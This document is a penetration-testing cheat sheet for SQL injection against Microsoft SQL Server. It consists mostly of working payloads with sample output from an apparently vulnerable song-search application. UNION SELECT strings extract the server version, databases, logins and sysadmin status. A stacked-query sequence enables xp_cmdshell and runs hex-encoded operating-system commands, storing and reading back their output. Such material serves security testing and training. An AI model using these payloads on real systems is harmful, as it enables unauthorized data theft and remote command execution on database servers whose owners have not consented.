# MSSQL

[http://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet](http://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet)  
[https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MSSQL%20Injection.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MSSQL%20Injection.md)

## UNION SELECT

### Getting version

```text
' UNION SELECT (SELECT @@version),2 --
```

Song name: Microsoft SQL Server 2012 - 11.0.2100.60 \(X64\) Feb 10 2012 19:39:15 Copyright \(c\) Microsoft Corporation Express Edition \(64-bit\) on Windows NT 6.2 \(Build 9200: \) \(Hypervisor\) - From the year: 2

### Getting current DB:

```text
' UNION SELECT (SELECT DB_NAME()),2 --
```

Song name: music - From the year: 2

### Getting current user:

Song name: dbo - From the year: 2

### Is our user a sysadmin:

```text
' UNION SELECT (SELECT is_srvrolemember('sysadmin')),2 --
```

Song name: **1** - From the year: 2  
\(returns 1 for true, 0 for false\)

### Listing databases:

```text
' UNION SELECT (SELECT DB_NAME(N)),2 --
```

Increment N to go through all the databases.

Song name: master - From the year: 2  
Song name: tempdb - From the year: 2  
Song name: model - From the year: 2  
Song name: msdb - From the year: 2  
Song name: music - From the year: 2

#### Using CAST:

```text
' UNION ALL SELECT CAST(name AS NVARCHAR(4000)),NULL FROM master..sysdatabases--
```

Song name: master - From the year:  
Song name: tempdb - From the year:  
Song name: model - From the year:  
Song name: msdb - From the year:  
Song name: music - From the year:

### Listing users using CAST:

```text
' UNION ALL SELECT CAST(name AS NVARCHAR(4000)),NULL FROM master..syslogins--
```

Song name: sa - From the year:  
Song name: \#\#MS\_SQLResourceSigningCertificate\#\# - From the year:  
Song name: \#\#MS\_SQLReplicationSigningCertificate\#\# - From the year:  
Song name: \#\#MS\_SQLAuthenticatorCertificate\#\# - From the year:  
Song name: \#\#MS\_PolicySigningCertificate\#\# - From the year:  
Song name: \#\#MS\_SmoExtendedSigningCertificate\#\# - From the year:  
Song name: \#\#MS\_PolicyEventProcessingLogin\#\# - From the year:  
Song name: \#\#MS\_PolicyTsqlExecutionLogin\#\# - From the year:  
Song name: \#\#MS\_AgentSigningCertificate\#\# - From the year:  
Song name: \*\*\Administrator - From the year:  
Song name: NT SERVICE\SQLWriter - From the year:  
Song name: NT SERVICE\Winmgmt - From the year:  
Song name: NT SERVICE\MSSQL$SQLEXPRESS - From the year:  
Song name: BUILTIN\Users - From the year:  
Song name: NT AUTHORITY\SYSTEM - From the year:

## xp\_cmdshell

### Checking if our user is a sysadmin

```text
' UNION SELECT (SELECT is_srvrolemember('sysadmin')),2 --
```

Running xp-cmdshell and getting the output.

### Enabling xp\_cmdshell

```text
';EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; --
```

### Running commands

#### Setting up the table:

```text
';CREATE TABLE sqlmapoutput(id INT PRIMARY KEY IDENTITY, data NVARCHAR(4000))--
```

#### Running the command:

@cmd= {hex encoded command}

For example whoami -- &gt; **0x**77686f616d69

```text
';DECLARE @cmd VARCHAR(8000);SET @cmd=0x77686f616d69;INSERT INTO sqlmapoutput(data) EXEC master..xp_cmdshell @cmd--
```

Will insert command output into the sqlmapout table.

#### Reading the output:

```text
' UNION ALL SELECT CAST(data AS NVARCHAR(4000)),NULL FROM sqlmapoutput--
```

#### Deleting the table:

```text
';DELETE FROM sqlmapoutput--
```

#### Drop the table:

```text
';DROP TABLE sqlmapoutput--
```

